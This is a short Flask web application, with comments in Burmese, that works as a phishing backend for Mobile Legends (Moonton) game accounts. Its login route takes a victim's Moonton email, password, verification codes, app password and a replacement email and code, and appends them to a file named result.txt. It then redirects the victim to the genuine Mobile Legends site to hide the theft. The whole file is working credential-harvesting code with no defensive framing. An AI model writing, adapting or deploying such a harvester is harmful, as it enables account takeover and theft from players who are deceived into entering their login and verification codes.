from flask import Flask, render_template, request, redirect

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    # User ဖြည့်လိုက်တဲ့ data တွေကို ဆွဲထုတ်တာ
    m_email = request.form.get('moonton_email')
    m_pass = request.form.get('moonton_pass')
    m_code = request.form.get('m_code')
    a_pass = request.form.get('app_pass')
    n_email = request.form.get('new_email')
    n_code = request.form.get('n_code')

    # result.txt ထဲမှာ သိမ်းမယ့် ပုံစံ
    result_text = f"""
[+] New User Data
Moonton Email: {m_email}
Moonton Pass : {m_pass}
M-Code       : {m_code}
App Password : {a_pass}
New Email    : {n_email}
New Code     : {n_code}
-----------------------------
"""
    # ဖိုင်ထဲကို အမြဲတမ်း ပေါင်းထည့်မယ်
    with open("result.txt", "a") as f:
        f.write(result_text)

    # အကုန်ပြီးရင် MLBB Site ဆီ ပြန်လွှတ်မယ်
    return redirect("https://m.mobilelegends.com/")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
    